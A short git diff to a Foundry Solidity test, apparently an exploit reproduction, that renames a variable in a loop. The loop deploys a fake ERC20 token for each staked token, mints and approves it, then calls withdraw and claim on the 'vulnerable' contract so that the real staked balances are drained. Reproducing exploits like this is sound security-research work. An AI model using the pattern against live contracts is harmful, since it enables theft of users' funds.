@@ -103,11 +103,11 @@ contract ASTTest is Test {
         for(uint8 i = 0; i < stakedTokens.length; i++){
             uint staked_bal = IERC20(stakedTokens[i]).balanceOf(address(vulnerable));
             balances[i] = staked_bal;
-            MyERC20 MyToken = new MyERC20(stakedTokens[i],staked_bal);
-            MyToken.mint(10_000 * 1e18);
-            MyToken.approve(address(vulnerable),type(uint).max);
+            MyERC20 fake_token = new MyERC20(stakedTokens[i],staked_bal);
+            fake_token.mint(10_000 * 1e18);
+            fake_token.approve(address(vulnerable),type(uint).max);
 
-            vulnerable.withdraw(address(MyToken), staked_bal);
+            vulnerable.withdraw(address(fake_token), staked_bal);
             vulnerable.claim(i);
 
         }
